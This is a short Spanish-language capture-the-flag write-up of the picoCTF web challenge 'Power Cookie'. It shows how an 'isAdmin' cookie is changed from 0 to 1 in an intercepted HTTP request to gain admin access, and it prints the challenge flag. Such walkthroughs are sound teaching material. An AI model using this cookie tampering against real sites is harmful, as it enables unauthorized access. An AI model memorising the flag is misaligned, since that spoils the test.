---
title: Power Cookie
date: 2025-05-14 13:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, more sqli, explotación web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>Power Cookie
Author: LT 'syreal' Jones
Description
Can you get the flag? Go to this website and see what you can discover.
{: .prompt-tip }

Lanzamos la instancia y nos aparece una web, pulsamos el botón de "login as guess"
Si atendemos a lo que pasa en la consola del desarrollador nos encontramos con una cookie, bastante relevante

```
"isAdmin": "0"
```

Capturamos con ZAP y editamos el valor isAdmin para intentar cambiar el comportamiento 
```
GET http://saturn.picoctf.net:58859/check.php HTTP/1.1
Host: saturn.picoctf.net:58859
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://saturn.picoctf.net:58859/
Connection: keep-alive
Cookie: isAdmin=1
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

``` html
<html>
<body>
<p>picoCTF{gr4d3_A_c00k13_0d351e23}</p>
</body>
</html>
```

flag: **picoCTF{gr4d3_A_c00k13_0d351e23}**